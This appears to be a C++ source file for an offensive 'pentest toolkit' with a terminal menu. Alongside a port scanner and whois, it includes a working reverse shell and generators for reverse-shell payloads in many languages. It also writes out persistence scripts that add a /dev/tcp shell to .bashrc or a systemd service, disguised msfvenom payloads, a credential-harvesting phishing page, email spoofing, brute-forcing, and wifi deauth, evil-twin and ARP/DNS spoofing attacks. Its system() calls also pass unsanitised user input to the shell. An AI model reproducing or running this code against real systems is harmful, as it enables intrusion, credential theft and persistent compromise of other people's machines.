// pentrax.cpp - Basic Pentesting Toolkit in C++
// Inspired by pentraX (Python)
// Features: Port Scanner, Whois Lookup, HTTP Headers Grabber, Nmap Scan, Exit
// Compile with: g++ -o pentrax pentrax.cpp

#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <cstdlib>
#include <cstring>
#include <cstdio>
#include <netdb.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <signal.h>
#include <openssl/sha.h>
#include <openssl/md5.h>
#include <set>
#include <algorithm> // For transform
#include <regex>
#include <sys/stat.h>
#include <numeric> // For accumulate
#include <openssl/evp.h> // Required for EVP_MD_CTX
#include <csignal>
#include <limits> // Required for numeric_limits

using namespace std;

void clear_screen() {
    // Works on most UNIX terminals
    cout << "\033[2J\033[1;1H";
}

void banner() {
    cout << "\033[36m";
    cout << "\n";
    cout << "██████╗ ███████╗███╗   ██╗████████╗██████╗  █████╗ ██╗  ██╗\n";
    cout << "██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗╚██╗██╔╝\n";
    cout << "██████╔╝█████╗  ██╔██╗ ██║   ██║   ██████╔╝███████║ ╚███╔╝ \n";
    cout << "██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔═══╝ ██╔══██║ ██╔██╗ \n";
    cout << "██║     ███████╗██║ ╚████║   ██║   ██║     ██║  ██║██╔╝ ██╗\n";
    cout << "╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝\n";
    cout << "        FULL PENTEST TOOLKIT (C++ v1.0)\n";
    cout << "\033[1mCreated by astra-incognito\033[0m\033[36m\n";
    cout << "GitHub: https://github.com/astra-incognito/\n";
    cout << "\033[0m";
}

void disclaimer() {
    cout << "\033[93m\033[1mDISCLAIMER:\033[0m\033[93m\n";
    cout << "This toolkit is for educational and authorized penetration testing use only.\n";
    cout << "Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical.\n";
    cout << "By using this toolkit, you agree to comply with all applicable laws and regulations.\n";
    cout << "The author assumes no liability for misuse or damage caused by this software.\n";
    cout << "\033[0m\n";
}

bool tool_exists(const string& tool) {
    string cmd = "which " + tool + " > /dev/null 2>&1";
    return system(cmd.c_str()) == 0;
}

void port_scan() {
    string target;
    int start = 1, end = 1024;
    cout << "Target IP: ";
    cin >> target;
    cout << "Port range (e.g. 20-1000, default 1-1024): ";
    string range;
    cin.ignore();
    getline(cin, range);
    if (!range.empty() && range.find('-') != string::npos) {
        sscanf(range.c_str(), "%d-%d", &start, &end);
    }
    cout << "[+] Scanning ports " << start << "-" << end << " on " << target << endl;
    for (int port = start; port <= end; ++port) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) continue;
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(port);
        inet_pton(AF_INET, target.c_str(), &serv_addr.sin_addr);
        struct timeval tv;
        tv.tv_sec = 0; tv.tv_usec = 200000;
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
        int res = connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
        if (res == 0) {
            cout << "[OPEN] Port " << port << endl;
        }
        close(sockfd);
    }
}

void whois_lookup() {
    if (!tool_exists("whois")) {
        cout << "\033[1;31m[!] whois is not installed. Install with: sudo apt install whois\033[0m\n";
        return;
    }
    string domain;
    cout << "Domain: ";
    cin >> domain;
    cout << "[+] Running whois for " << domain << "...\n";
    string cmd = "whois " + domain;
    system(cmd.c_str());
}

void http_headers() {
    string url;
    cout << "URL (http://...): ";
    cin >> url;
    cout << "[+] Fetching HTTP headers for " << url << "...\n";
    string cmd = "curl -I --max-time 5 '" + url + "'";
    system(cmd.c_str());
}

void nmap_scan() {
    string target, options;
    cout << "Target for Nmap: ";
    cin >> target;
    cin.ignore();
    cout << "Nmap options (default: -A -T4): ";
    getline(cin, options);
    if (options.empty()) options = "-A -T4";
    cout << "[+] Running nmap " << options << " " << target << "...\n";
    string cmd = "nmap " + options + " " + target;
    system(cmd.c_str());
}

void hydra_bruteforce() {
    string ip, username, service, wordlist;
    cout << "Target IP: ";
    cin >> ip;
    cout << "Username: ";
    cin >> username;
    cout << "Service (e.g. ssh, ftp): ";
    cin >> service;
    cin.ignore();
    cout << "Wordlist path (default /usr/share/wordlists/rockyou.txt): ";
    getline(cin, wordlist);
    if (wordlist.empty()) wordlist = "/usr/share/wordlists/rockyou.txt";
    cout << "[+] Running hydra on " << ip << " (service: " << service << ", user: " << username << ")...\n";
    string cmd = "hydra -l '" + username + "' -P '" + wordlist + "' '" + ip + "' " + service;
    system(cmd.c_str());
}

void sqlmap_scan() {
    string url, options;
    cout << "Target URL (vulnerable to SQLi): ";
    cin >> url;
    cin.ignore();
    cout << "SQLMap options (default: --batch --crawl=1): ";
    getline(cin, options);
    if (options.empty()) options = "--batch --crawl=1";
    cout << "[+] Running sqlmap on " << url << "...\n";
    string cmd = "sqlmap -u '" + url + "' " + options;
    system(cmd.c_str());
}

void reverse_shell() {
    string ip, port;
    cout << "Connect back to IP: ";
    cin >> ip;
    cout << "Port: ";
    cin >> port;
    cout << "[!] WARNING: Use the reverse shell only for authorized, ethical testing.\n";
    cout << "[+] Attempting to connect to " << ip << ":" << port << "...\n";
    // Fork and exec /bin/bash with redirected stdin/stdout/stderr to socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return;
    }
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(stoi(port));
    inet_pton(AF_INET, ip.c_str(), &serv_addr.sin_addr);
    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("connect");
        close(sockfd);
        return;
    }
    int pid = fork();
    if (pid == 0) {
        // Child: redirect stdio and exec shell
        dup2(sockfd, 0); // stdin
        dup2(sockfd, 1); // stdout
        dup2(sockfd, 2); // stderr
        execl("/bin/bash", "bash", "-i", NULL);
        perror("execl");
        exit(1);
    } else if (pid > 0) {
        // Parent: wait a bit then kill child
        sleep(2);
        kill(pid, SIGKILL);
    }
    close(sockfd);
}

void generate_reverse_shell_payload() {
    string ip, port;
    cout << "Attacker IP (your IP): ";
    cin >> ip;
    cout << "Port to connect back to: ";
    cin >> port;
    cout << "Select payload type:\n";
    cout << "1. Python (default)\n";
    cout << "2. Bash\n";
    cout << "3. Netcat\n";
    cout << "4. Perl\n";
    cout << "5. PHP\n";
    cout << "6. PowerShell (Windows)\n";
    cout << "7. Android Bash (rooted/busybox)\n";
    cout << "Payload type [1-7]: ";
    string ptype;
    cin >> ptype;
    string payload;
    if (ptype == "2") {
        payload = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
    } else if (ptype == "3") {
        payload = "nc -e /bin/bash " + ip + " " + port;
    } else if (ptype == "4") {
        payload = "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'";
    } else if (ptype == "5") {
        payload = "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/bash -i <&3 >&3 2>&3\");'";
    } else if (ptype == "6") {
        payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"" + ip + "\"," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
    } else if (ptype == "7") {
        payload = "/system/bin/sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
    } else {
        payload = "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'";
    }
    cout << "\n[+] Copy and run this on the target:\n";
    cout << payload << endl;
}

void start_listener() {
    string port;
    cout << "Port to listen on: ";
    cin >> port;
    cout << "[+] To listen for a reverse shell, run this command in your terminal:\n";
    cout << "nc -lvnp " << port << endl;
    cout << "Launch listener now? (y/N): ";
    string auto_launch;
    cin >> auto_launch;
    if (auto_launch == "y" || auto_launch == "Y") {
        string cmd = "nc -lvnp " + port;
        cout << "[+] Starting listener on port " << port << " (press Ctrl+C to stop)...\n";
        system(cmd.c_str());
    }
}

void generate_persistence_script() {
    string ip, port;
    cout << "Attacker IP (your IP): ";
    cin >> ip;
    cout << "Port to connect back to: ";
    cin >> port;
    cout << "Select persistence method:\n";
    cout << "1. Add to ~/.bashrc (default)\n";
    cout << "2. Add to ~/.profile\n";
    cout << "3. Create systemd service (root)\n";
    cout << "Method [1-3]: ";
    string method;
    cin >> method;
    string payload = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
    string script;
    if (method == "2") {
        script = "echo \"" + payload + "\" >> ~/.profile";
    } else if (method == "3") {
        script =
            "echo -e '[Unit]\\nDescription=Reverse Shell\\n[Service]\\nType=simple\\nExecStart=/bin/bash -c \"" + payload + "\"\\n[Install]\\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/revshell.service > /dev/null\n"
            "sudo systemctl daemon-reload\n"
            "sudo systemctl enable revshell.service\n"
            "sudo systemctl start revshell.service";
    } else {
        script = "echo \"" + payload + "\" >> ~/.bashrc";
    }
    cout << "\n[+] Run this on the target for persistence:\n";
    cout << script << endl;
}

void generate_msfvenom_payload() {
    cout << "[!] Automated msfvenom payload generator (requires Metasploit installed)\n";
    cout << "Select payload type:\n";
    cout << "1. Windows EXE (.exe)\n";
    cout << "2. PDF (.pdf, requires vulnerable reader)\n";
    cout << "3. Word DOCX (.docx, macro, requires user to enable macros)\n";
    cout << "4. Android APK (.apk)\n";
    cout << "Payload type [1-4]: ";
    string ptype;
    cin >> ptype;
    string lhost, lport, output;
    cout << "LHOST (your IP): ";
    cin >> lhost;
    cout << "LPORT (your port): ";
    cin >> lport;
    cout << "Output filename (e.g. shell.exe): ";
    cin >> output;
    if (lhost.empty() || lport.empty() || output.empty()) {
        cout << "[-] LHOST, LPORT, and output filename are required.\n";
        return;
    }
    string payload, fmt, cmd;
    if (ptype == "1") {
        payload = "windows/shell_reverse_tcp";
        fmt = "exe";
    } else if (ptype == "2") {
        payload = "windows/meterpreter/reverse_tcp";
        fmt = "pdf";
    } else if (ptype == "3") {
        payload = "windows/meterpreter/reverse_tcp";
        fmt = "raw";
    } else if (ptype == "4") {
        payload = "android/meterpreter/reverse_tcp";
        fmt = "apk";
    } else {
        cout << "[-] Invalid payload type.\n";
        return;
    }
    cout << "[+] Generating payload with msfvenom...\n";
    if (ptype == "3") {
        string macro_file = output;
        if (output.find(".txt") == string::npos) macro_file += ".txt";
        cmd = "msfvenom -p " + payload + " LHOST=" + lhost + " LPORT=" + lport + " -f " + fmt + " -o " + macro_file;
        cout << "[!] For DOCX, you must embed the macro from " << macro_file << " into a Word document manually.\n";
    } else {
        cmd = "msfvenom -p " + payload + " LHOST=" + lhost + " LPORT=" + lport + " -f " + fmt + " -o " + output;
    }
    system(cmd.c_str());
    cout << "[+] Payload generated: " << (ptype == "3" ? output + ".txt" : output) << endl;
    if (ptype == "2") {
        cout << "[!] PDF payloads require a vulnerable PDF reader to be effective.\n";
    }
    if (ptype == "3") {
        cout << "[!] Embed the macro into a Word document and instruct the user to enable macros.\n";
    }
    if (ptype == "4") {
        cout << "[!] APK payloads require installation and permissions on the target device.\n";
        cout << "[!] To catch the session, use Metasploit multi/handler:\n";
        cout << "    msfconsole\n";
        cout << "    use exploit/multi/handler\n";
        cout << "    set payload android/meterpreter/reverse_tcp\n";
        cout << "    set LHOST " << lhost << endl;
        cout << "    set LPORT " << lport << endl;
        cout << "    run\n";
    }
}

void dir_bruteforce() {
    string base, wordlist;
    cout << "Base URL (http/https): ";
    cin >> base;
    cout << "Dir wordlist path (default /usr/share/wordlists/dirb/common.txt): ";
    cin.ignore();
    getline(cin, wordlist);
    if (wordlist.empty()) wordlist = "/usr/share/wordlists/dirb/common.txt";
    cout << "[+] Running gobuster on " << base << "...\n";
    string cmd = "gobuster dir -u '" + base + "' -w '" + wordlist + "'";
    int ret = system(cmd.c_str());
    if (ret != 0) {
        cout << "[!] gobuster failed or not found. Trying dirb...\n";
        cmd = "dirb '" + base + "' '" + wordlist + "'";
        system(cmd.c_str());
    }
}

void find_subdomains() {
    string domain, wordlist;
    cout << "Domain: ";
    cin >> domain;
    cout << "Subdomain wordlist path (default /usr/share/wordlists/subdomains-top1million-5000.txt): ";
    cin.ignore();
    getline(cin, wordlist);
    if (wordlist.empty()) wordlist = "/usr/share/wordlists/subdomains-top1million-5000.txt";
    cout << "[+] Finding subdomains for " << domain << "...\n";
    FILE* f = fopen(wordlist.c_str(), "r");
    if (!f) {
        cout << "[-] Subdomain wordlist not found!\n";
        return;
    }
    char buf[256];
    int found = 0, tested = 0;
    while (fgets(buf, sizeof(buf), f)) {
        string sub(buf);
        sub.erase(sub.find_last_not_of(" \n\r\t") + 1);
        string subdomain = sub + "." + domain;
        struct hostent* he = gethostbyname(subdomain.c_str());
        if (he) {
            cout << "[FOUND] " << subdomain << endl;
            found++;
        }
        tested++;
        if (tested % 500 == 0) cout << "  ..." << tested << " subdomains tested...\n";
    }
    fclose(f);
    if (found)
        cout << "[+] " << found << " subdomains found.\n";
    else
        cout << "[!] No subdomains found.\n";
}

void dns_lookup() {
    string domain;
    cout << "Domain: ";
    cin >> domain;
    cout << "[+] DNS lookup for " << domain << "\n";
    vector<string> types = {"A", "AAAA", "MX", "TXT"};
    for (const auto& rtype : types) {
        string cmd = "dig +short " + domain + " " + rtype;
        cout << rtype << " records:\n";
        system(cmd.c_str());
    }
}

void ssl_info() {
    string domain;
    cout << "Domain (no http): ";
    cin >> domain;
    cout << "[+] Fetching SSL certificate info for " << domain << "...\n";
    string cmd = "echo | openssl s_client -servername " + domain + " -connect " + domain + ":443 2>/dev/null | openssl x509 -noout -text";
    system(cmd.c_str());
}

void crack_hash() {
    string h, wordlist, hash_type;
    cout << "Hash: ";
    cin >> h;
    cout << "Wordlist path (default /usr/share/wordlists/rockyou.txt): ";
    cin.ignore();
    getline(cin, wordlist);
    if (wordlist.empty()) wordlist = "/usr/share/wordlists/rockyou.txt";
    cout << "Hash type (sha256/sha1/md5, default sha256): ";
    getline(cin, hash_type);
    if (hash_type.empty()) hash_type = "sha256";
    FILE* f = fopen(wordlist.c_str(), "r");
    if (!f) {
        cout << "[-] Wordlist not found: " << wordlist << endl;
        return;
    }
    cout << "[+] Cracking " << hash_type << " hash using " << wordlist << " ...\n";
    char buf[256];
    bool found = false;
    int i = 0;
    while (fgets(buf, sizeof(buf), f)) {
        string word(buf);
        word.erase(word.find_last_not_of(" \n\r\t") + 1);
        string hash_hex;
        if (hash_type == "md5") {
            unsigned char md[MD5_DIGEST_LENGTH];
            EVP_MD_CTX* ctx = EVP_MD_CTX_new();
            EVP_DigestInit_ex(ctx, EVP_md5(), NULL);
            EVP_DigestUpdate(ctx, word.c_str(), word.size());
            EVP_DigestFinal_ex(ctx, md, NULL);
            EVP_MD_CTX_free(ctx);
            char hex[33];
            for (int j = 0; j < 16; ++j) sprintf(hex + j*2, "%02x", md[j]);
            hex[32] = 0;
            hash_hex = hex;
        } else if (hash_type == "sha1") {
            unsigned char md[20];
            EVP_MD_CTX* ctx = EVP_MD_CTX_new();
            EVP_DigestInit_ex(ctx, EVP_sha1(), NULL);
            EVP_DigestUpdate(ctx, word.c_str(), word.size());
            EVP_DigestFinal_ex(ctx, md, NULL);
            EVP_MD_CTX_free(ctx);
            char hex[41];
            for (int j = 0; j < 20; ++j) sprintf(hex + j*2, "%02x", md[j]);
            hex[40] = 0;
            hash_hex = hex;
        } else {
            unsigned char md[SHA256_DIGEST_LENGTH];
            EVP_MD_CTX* ctx = EVP_MD_CTX_new();
            EVP_DigestInit_ex(ctx, EVP_sha256(), NULL);
            EVP_DigestUpdate(ctx, word.c_str(), word.size());
            EVP_DigestFinal_ex(ctx, md, NULL);
            EVP_MD_CTX_free(ctx);
            char hex[65];
            for (int j = 0; j < 32; ++j) sprintf(hex + j*2, "%02x", md[j]);
            hex[64] = 0;
            hash_hex = hex;
        }
        if (hash_hex == h) {
            cout << "[+] Hash cracked: " << word << endl;
            found = true;
            break;
        }
        if (++i % 100000 == 0) cout << "  ..." << i << " words tried...\n";
    }
    fclose(f);
    if (!found) cout << "[-] Hash not found in wordlist.\n";
}

void cve_lookup() {
    string keyword;
    cout << "Keyword (e.g. apache) or CVE ID (e.g. CVE-2023-1234): ";
    cin >> keyword;
    cout << "[+] Searching CVEs for '" << keyword << "'...\n";
    string cmd = "curl -s https://cve.circl.lu/api/search/" + keyword + " | head -c 2000";
    system(cmd.c_str());
}

void osint_wordlist_generator() {
    cout << "[+] OSINT Wordlist Generator\n";
    string name, nickname, company, birth_year, keywords;
    cout << "Target's full name: ";
    cin.ignore();
    getline(cin, name);
    cout << "Nickname/alias (optional): ";
    getline(cin, nickname);
    cout << "Company/organization (optional): ";
    getline(cin, company);
    cout << "Birth year (optional): ";
    getline(cin, birth_year);
    cout << "Other keywords (comma separated): ";
    getline(cin, keywords);
    vector<string> base;
    if (!name.empty()) {
        istringstream iss(name);
        string part;
        while (iss >> part) base.push_back(part);
        base.push_back(name);
    }
    if (!nickname.empty()) base.push_back(nickname);
    if (!company.empty()) base.push_back(company);
    if (!birth_year.empty()) base.push_back(birth_year);
    istringstream kss(keywords);
    string k;
    while (getline(kss, k, ',')) {
        if (!k.empty()) base.push_back(k);
    }
    set<string> wordlist;
    for (const auto& word : base) {
        wordlist.insert(word);
        string lw = word, uw = word, cw = word;
        transform(lw.begin(), lw.end(), lw.begin(), ::tolower);
        transform(uw.begin(), uw.end(), uw.begin(), ::toupper);
        if (!word.empty()) cw[0] = toupper(cw[0]);
        wordlist.insert(lw);
        wordlist.insert(uw);
        wordlist.insert(cw);
        vector<string> suffixes = {"123", "!", "2023", "2024", "#", "@", "1", "01"};
        for (const auto& s : suffixes) wordlist.insert(word + s);
    }
    cout << "Save wordlist as (default osint_wordlist.txt): ";
    string fname;
    getline(cin, fname);
    if (fname.empty()) fname = "osint_wordlist.txt";
    FILE* f = fopen(fname.c_str(), "w");
    for (const auto& w : wordlist) fprintf(f, "%s\n", w.c_str());
    fclose(f);
    cout << "[+] Wordlist saved to " << fname << " (" << wordlist.size() << " entries)\n";
}

void email_breach_check() {
    string email;
    cout << "Email to check for breaches: ";
    cin >> email;
    cout << "[+] Checking haveibeenpwned.com for breaches...\n";
    string cmd = "curl -s https://haveibeenpwned.com/unifiedsearch/" + email + " | head -c 2000";
    system(cmd.c_str());
}

void social_media_search() {
    string username;
    cout << "Username to search on social media: ";
    cin >> username;
    if (username.empty()) {
        cout << "[-] No username provided.\n";
        return;
    }
    cout << "[+] Social media profile URLs for '" << username << "':\n";
    cout << "  Twitter: https://twitter.com/" << username << endl;
    cout << "  Instagram: https://instagram.com/" << username << endl;
    cout << "  GitHub: https://github.com/" << username << endl;
    cout << "  LinkedIn: https://www.linkedin.com/in/" << username << endl;
    cout << "[!] Open these links in your browser to check for existence and public info.\n";
}

void pastebin_leak_search() {
    string query;
    cout << "Keyword/email/username/domain to search in public pastes: ";
    cin.ignore();
    getline(cin, query);
    if (query.empty()) {
        cout << "[-] No query provided.\n";
        return;
    }
    cout << "[+] Searching public paste sites for '" << query << "' (basic web search)...\n";
    string url = "https://www.google.com/search?q=site:pastebin.com+" + query;
    cout << "[!] Open this in your browser: " << url << endl;
}

void osint_report() {
    cout << "[+] Generating OSINT report...\n";
    string fname;
    cout << "Save report as (default osint_report.txt): ";
    cin.ignore();
    getline(cin, fname);
    if (fname.empty()) fname = "osint_report.txt";
    FILE* f = fopen(fname.c_str(), "w");
    fprintf(f, "OSINT Report - Summary\n====================\n\n(Add your findings here as you use the toolkit!)\n");
    fclose(f);
    cout << "[+] OSINT report saved as " << fname << endl;
}

void setoolkit() {
    if (!tool_exists("setoolkit")) {
        cout << "\033[1;31m[!] SET is not installed. Install with: sudo apt install setoolkit\033[0m\n";
        return;
    }
    cout << "[!] WARNING: Use the Social Engineering Toolkit (SET) only for authorized, ethical testing.\n";
    cout << "[!] SET requires sudo/root permissions.\n";
    cout << "[+] Launching Social Engineering Toolkit...\n";
    system("sudo setoolkit");
}

void spoof_email() {
    string sender, recipient, subject, body;
    cout << "From (fake): ";
    cin.ignore();
    getline(cin, sender);
    cout << "To (real): ";
    getline(cin, recipient);
    regex email_regex("^[^@[:space:]]+@[^@[:space:]]+\\.[^@[:space:]]+$");
    if (!regex_match(sender, email_regex) || !regex_match(recipient, email_regex)) {
        cout << "[-] Invalid email address format.\n";
        return;
    }
    cout << "Subject: ";
    getline(cin, subject);
    cout << "Body: ";
    getline(cin, body);
    cout << "\n[!] This will attempt to send mail using your system's sendmail or configured relay.\n";
    string message = "Subject: " + subject + "\nFrom: " + sender + "\nTo: " + recipient + "\n\n" + body;
    if (system("which sendmail > /dev/null 2>&1") != 0) {
        cout << "[-] sendmail not found. Install with: sudo apt install sendmail\n";
        cout << "[!] Here is the raw email content. You can try sending it manually:\n";
        cout << "\n--- RAW EMAIL ---\n" << message << "\n--- END ---\n";
        return;
    }
    string cmd = "echo \"" + message + "\" | sendmail '" + recipient + "'";
    int ret = system(cmd.c_str());
    if (ret == 0) {
        cout << "[+] Spoofed email sent.\n";
    } else {
        cout << "[-] sendmail failed.\n";
        cout << "[!] Here is the raw email content. You can try sending it manually:\n";
        cout << "\n--- RAW EMAIL ---\n" << message << "\n--- END ---\n";
    }
}

void phishing_page() {
    string folder = "phish_page";
    mkdir(folder.c_str(), 0755);
    cout << "[!] WARNING: Use phishing pages only for authorized, ethical testing.\n";
    cout << "Use custom HTML template? (y/N): ";
    string use_custom;
    cin >> use_custom;
    string html;
    if (use_custom == "y" || use_custom == "Y") {
        cout << "Paste your custom HTML (end with a single line containing only END):\n";
        cin.ignore();
        string line;
        vector<string> lines;
        while (getline(cin, line)) {
            if (line == "END") break;
            lines.push_back(line);
        }
        html = accumulate(lines.begin(), lines.end(), string(), [](const string& a, const string& b) { return a + (a.empty() ? "" : "\n") + b; });
    } else {
        cin.ignore();
        string title, prompt;
        cout << "Page title: ";
        getline(cin, title);
        cout << "Prompt text (e.g. Enter your password): ";
        getline(cin, prompt);
        html = "<html><head><title>" + title + "</title></head>"
               "<body><h2>" + prompt + "</h2>"
               "<form method='POST' action='steal.php'>"
               "<input name='user' placeholder='Username'><br>"
               "<input name='pass' type='password' placeholder='Password'><br>"
               "<input type='submit'>"
               "</form></body></html>";
    }
    string path = folder + "/index.html";
    FILE* f = fopen(path.c_str(), "w");
    fprintf(f, "%s\n", html.c_str());
    fclose(f);
    cout << "[+] Phishing page saved to ./" << path << endl;
}

void wifi_scan() {
    if (!tool_exists("airmon-ng")) {
        cout << "\033[1;31m[!] airmon-ng is not installed. Install with: sudo apt install aircrack-ng\033[0m\n";
        return;
    }
    cout << "[+] Scanning for WiFi networks (requires monitor mode and root)...\n";
    string iface;
    cout << "Wireless interface (e.g. wlan0): ";
    cin >> iface;
    cout << "[*] Enabling monitor mode...\n";
    string cmd = "sudo airmon-ng start " + iface;
    system(cmd.c_str());
    string mon_iface = iface;
    if (iface.find("mon") == string::npos) mon_iface += "mon";
    cout << "[*] Using monitor interface: " << mon_iface << endl;
    cout << "[*] Press Ctrl+C to stop scanning.\n";
    cmd = "sudo airodump-ng " + mon_iface;
    system(cmd.c_str());
    cmd = "sudo airmon-ng stop " + mon_iface;
    system(cmd.c_str());
}

void wifi_handshake_capture() {
    if (!tool_exists("airmon-ng") || !tool_exists("airodump-ng")) {
        cout << "\033[1;31m[!] airmon-ng, airodump-ng, or aircrack-ng is not installed. Install with: sudo apt install aircrack-ng\033[0m\n";
        return;
    }
    cout << "[+] Capture WPA handshake (requires monitor mode and root)...\n";
    string iface, bssid, channel, out_file;
    cout << "Wireless interface (e.g. wlan0): ";
    cin >> iface;
    cout << "Target BSSID (AP MAC): ";
    cin >> bssid;
    cout << "Channel: ";
    cin >> channel;
    cout << "Output file (default: handshake.cap): ";
    cin.ignore();
    getline(cin, out_file);
    if (out_file.empty()) out_file = "handshake.cap";
    cout << "[*] Enabling monitor mode...\n";
    string cmd = "sudo airmon-ng start " + iface;
    system(cmd.c_str());
    string mon_iface = iface;
    if (iface.find("mon") == string::npos) mon_iface += "mon";
    cout << "[*] Using monitor interface: " << mon_iface << endl;
    cout << "[*] Capturing handshake. Press Ctrl+C when done.\n";
    cmd = "sudo airodump-ng -c " + channel + " --bssid " + bssid + " -w " + out_file.substr(0, out_file.find_last_of('.')) + " " + mon_iface;
    system(cmd.c_str());
    cmd = "sudo airmon-ng stop " + mon_iface;
    system(cmd.c_str());
    cout << "[+] Handshake saved to " << out_file << endl;
}

void wifi_crack_handshake() {
    if (!tool_exists("aircrack-ng")) {
        cout << "\033[1;31m[!] aircrack-ng is not installed. Install with: sudo apt install aircrack-ng\033[0m\n";
        return;
    }
    cout << "[+] Crack WPA/WPA2 handshake with aircrack-ng...\n";
    string cap_file, wordlist;
    cout << "Handshake .cap file: ";
    cin >> cap_file;
    cout << "Wordlist path (default /usr/share/wordlists/rockyou.txt): ";
    cin.ignore();
    getline(cin, wordlist);
    if (wordlist.empty()) wordlist = "/usr/share/wordlists/rockyou.txt";
    cout << "[*] Cracking with aircrack-ng...\n";
    string cmd = "aircrack-ng -w '" + wordlist + "' '" + cap_file + "'";
    system(cmd.c_str());
}

void wifi_deauth_attack() {
    if (!tool_exists("airmon-ng") || !tool_exists("aireplay-ng")) {
        cout << "\033[1;31m[!] airmon-ng, aireplay-ng, or aircrack-ng is not installed. Install with: sudo apt install aircrack-ng\033[0m\n";
        return;
    }
    cout << "[+] Deauthentication attack (requires monitor mode and root)...\n";
    string iface, bssid, client;
    cout << "Wireless interface (e.g. wlan0): ";
    cin >> iface;
    cout << "Target BSSID (AP MAC): ";
    cin >> bssid;
    cout << "Target client MAC (leave blank for broadcast): ";
    cin.ignore();
    getline(cin, client);
    cout << "[*] Enabling monitor mode...\n";
    string cmd = "sudo airmon-ng start " + iface;
    system(cmd.c_str());
    string mon_iface = iface;
    if (iface.find("mon") == string::npos) mon_iface += "mon";
    if (!client.empty()) {
        cout << "[*] Sending deauth packets to " << client << " on " << bssid << endl;
        cmd = "sudo aireplay-ng --deauth 10 -a " + bssid + " -c " + client + " " + mon_iface;
    } else {
        cout << "[*] Sending broadcast deauth packets on " << bssid << endl;
        cmd = "sudo aireplay-ng --deauth 10 -a " + bssid + " " + mon_iface;
    }
    system(cmd.c_str());
    cmd = "sudo airmon-ng stop " + mon_iface;
    system(cmd.c_str());
}

void evil_twin_ap() {
    if (!tool_exists("airmon-ng") || !tool_exists("airbase-ng")) {
        cout << "\033[1;31m[!] airmon-ng, airbase-ng, or aircrack-ng is not installed. Install with: sudo apt install aircrack-ng\033[0m\n";
        return;
    }
    cout << "[+] Evil Twin AP (requires monitor mode and root)...\n";
    string iface, ssid, channel;
    cout << "Wireless interface in monitor mode (e.g. wlan0mon): ";
    cin >> iface;
    cout << "SSID to clone (target network name): ";
    cin.ignore();
    getline(cin, ssid);
    cout << "Channel (default 6): ";
    getline(cin, channel);
    if (channel.empty()) channel = "6";
    cout << "[!] This will create a fake AP with the same SSID. Clients may connect if deauthed from the real AP.\n";
    cout << "[+] Running: sudo airbase-ng -e '" << ssid << "' -c " << channel << " " << iface << endl;
    string cmd = "sudo airbase-ng -e '" + ssid + "' -c " + channel + " " + iface;
    system(cmd.c_str());
}

void wifi_wifite() {
    if (!tool_exists("wifite")) {
        cout << "\033[1;31m[!] Wifite is not installed. Install with: sudo apt install wifite\033[0m\n";
        return;
    }
    cout << "[+] Launching Wifite (automated WiFi attack tool)...\n";
    system("sudo wifite");
}

void arp_spoof() {
    if (!tool_exists("arpspoof")) {
        cout << "\033[1;31m[!] arpspoof is not installed. Install with: sudo apt install arpspoof\033[0m\n";
        return;
    }
    cout << "[+] ARP Spoofing (MITM, requires root)...\n";
    string iface, target, gateway;
    cout << "Network interface (e.g. eth0): ";
    cin >> iface;
    cout << "Target IP (victim): ";
    cin >> target;
    cout << "Gateway IP (router): ";
    cin >> gateway;
    cout << "[!] You may need to enable IP forwarding: sudo sysctl -w net.ipv4.ip_forward=1\n";
    cout << "[+] Running: sudo arpspoof -i " << iface << " -t " << target << " " << gateway << endl;
    string cmd = "sudo arpspoof -i " + iface + " -t " + target + " " + gateway;
    system(cmd.c_str());
}

void dns_spoof() {
    if (!tool_exists("dnsspoof")) {
        cout << "\033[1;31m[!] dnsspoof is not installed. Install with: sudo apt install dnsspoof\033[0m\n";
        return;
    }
    cout << "[+] DNS Spoofing (MITM, requires root)...\n";
    string iface, hosts_file;
    cout << "Network interface (e.g. eth0): ";
    cin >> iface;
    cout << "Hosts file (e.g. /tmp/dnshosts): ";
    cin >> hosts_file;
    cout << "[+] Running: sudo dnsspoof -i " << iface << " -f " << hosts_file << endl;
    string cmd = "sudo dnsspoof -i " + iface + " -f " + hosts_file;
    system(cmd.c_str());
}

